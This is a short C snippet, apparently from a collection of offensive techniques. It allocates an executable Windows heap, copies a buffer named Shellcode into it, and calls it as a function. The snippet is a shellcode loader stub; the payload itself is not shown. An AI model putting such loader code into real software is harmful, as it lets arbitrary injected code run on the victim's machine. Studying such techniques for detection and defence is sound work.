// Windows also allows creating RWE heap regions.
void ExecuteShellcode(){
  HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(Shellcode), sizeof(Shellcode));
  char * BUFFER = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(Shellcode));
  memcpy(BUFFER, Shellcode, sizeof(Shellcode));
  (*(void(*)())BUFFER)();  
}